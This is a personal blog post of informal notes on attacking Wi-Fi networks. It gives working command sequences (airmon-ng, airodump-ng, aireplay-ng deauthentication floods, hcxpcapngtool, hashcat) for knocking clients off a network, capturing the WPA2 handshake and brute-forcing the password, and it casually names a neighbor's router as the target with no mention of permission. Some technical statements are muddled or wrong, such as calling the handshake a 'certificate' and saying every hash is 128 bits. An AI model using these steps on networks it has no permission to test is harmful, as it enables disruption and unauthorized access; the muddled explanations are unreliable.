---
layout : post
title : Sniffing packets and testing those
date : 2021-06-21
---

Wireless Network Adapter aka wifi card that is used to connect to wifi's 

WEP : oldest
WPA : Any certificate can lead to leak 
WPA2 : kick a user, then he reconnects, capture the certificate, 4-way handshake ,capture the certificate in betweeen   
WPA3 : all password attempts need to be on internet 



## Monitor mode
In this mode it becomes a radio sniffer, listens to all wireless signals in the air on a specific channel. Hear's everything happening in the room 

Wifi card can listen to 2.4Ghz, 5Ghz, 6Ghz bands 

It can sniff to any frequency band that its capable of in the above range

So what you do is you deauth the neighbor's router by sending 'deauthentication packets' ? ( how can I send deauth packets ? )
deauth is broken, part of 802.11 management frames, are not protected in WPA/WPA2 - Personal , can be spoofed / faked by anyone in the range 


Particular client deauth attack 

```
BSSID              STATION            PWR   Rate    Lost    Frames  Probes
AA:BB:CC:DD:EE:FF  11:22:33:44:55:66  -45   1e-1     0       800     -
```

Station MAC is the client MAC 

Get all clients :
`airodump-ng --bssid <router MAC> -c <channel> wlo1mon`

Deauth bombing: 
`aireplay-ng --deauth 100 -a <router MAC> wlo1mon`

Deauth particular user : 
`aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlo1mon`

When the client connects back, we capture the 4-way handshake packets EAPOL Packets, and they are stored to the .cap files 

We dont need to decrypt this, rather we just need to match with the leaked password list and get the wifi password !! 

## Steps to get the certificate

* Change to Monitor Mode : `sudo airmon-ng start wlo1`
 
* Scan the wifi : `sudo iwlist scan`

* Top networks
```
sudo airdump-ng start wlo1mon , or , 
sudo airodump-ng wlo1mon --write scan --output-format csv
```
* Set the channel to capture : `sudo iw dev wlo1mon set channel 1`

* Get all wifi present and bssid : `sudo iw dev wlo1 scan`

* Get into monitor mode : `sudo airmon-ng start wlo1`

* Manager mode : `sudo airmon-ng stop wlo1mon`

* Airodump : `sudo airodump-ng --bssid <bssid> -c <channel-name> -w capture wlo1mon`

To check how many beacons you have passed and see if any relevant signal has been catched or not !!
* sudo airodump-ng -w '<hack2>' -c '<1>' --bssid '<A8:DA:0C:BD:0B:57>' wlo1mon

* Send deauth request at scale : `sudo aireplay-ng --deauth 0 -a <48:22:54:4C:CA:18> wlo1mon`
OR  
`sudo aireplay-ng --deauth 20 -a 6c:4f:89:9a:3f:af wlo1mon --ignore-negative-one`


![hacked](https://github.com/user-attachments/assets/8ab726b5-c6b8-43e9-b184-a7207d1f3163)

So it all comes down to having a list of all possible passwords and then hash them and see which one is the matching the user and if the password is unique enough then we run out of luck ..  

## Using GPU to Crack the password 

Once the desired 4 way certificate is captured and you will see that your terminal output also use that to see the output in wireshark (optional) and then use it to generate .hash 

Dont use hashcat-utils (its not working for my case) it's actually making the file corrupt

Convert from `.cap` (captured certificates) to the .hash using `hcxpcaptool` from AUR and use it using 

`hcxpcapngtool -o correct_wpa2.hash hack3-01.cap`    

Then use this .hash file with hashcat to get the output 

Here the 22000 is for wpa2 , the last one is the mask and a : ascii , d: number-digits  
`hashcat -m 22000 -a 3 correct_wpa2.hash '?a?a?a?a?a?a?a?a?a'`


# Hashing 
So hashing is a one way process where no matter what amount of data you have it gets converted to a fixed size length(128 bits) and then that is matched with the other side and if both hashes matches then its a success !!


So its a nice way to check if everything was downloaded correctly from internet also rather than transferring more bits through the internet we can just share the hash and retrieve value so lower down the bandwidth ! 


